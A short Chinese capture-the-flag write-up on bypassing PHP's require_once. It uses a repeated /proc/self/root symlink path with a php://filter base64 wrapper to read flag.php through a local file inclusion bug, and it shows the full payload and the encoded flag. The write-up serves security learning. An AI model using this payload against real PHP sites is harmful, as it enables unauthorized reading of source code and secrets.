![](<./img/Pasted image 20230212095241.png>)

```php
<?php
highlight_file(__FILE__);
require_once 'flag.php';
if(isset($_GET['file'])) {
  require_once $_GET['file'];
}
```

参考这篇博客 [Require_once Bypass](https://web.archive.org/web/20230603040425/https://blog.rois.io/2020/require_once-bypass/)

![](<./img/Pasted image 20230212095417.png>)

`/proc/self/root`是指向`/`的符号链接

![](<./img/Pasted image 20230212095650.png>)

最多解析40层符号链接，`self`和`root`均为符号链接，因此复制粘贴二十次就到头了

`php`在到头了之后不会报错，而是将前面40个解析出来的实际路径和后面不能继续解析的带有符号链接的路径拼到一块，当成原始路径。因此在记录已包含文件路径的哈希表中自然查不到该路径，绕过了`once`

```
/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

```
PD9waHAKCiRmbGFnID0gJ2ZsYWd7YThjNTFkMzgtOGZhNi00ZjkyLWJiYTYtYTQ4N2I3YmY1ZDkzfSc7Cg==
```

![](<./img/Pasted image 20230212101412.png>)

#Web #PHP #LFI #linux #bypass #symlink
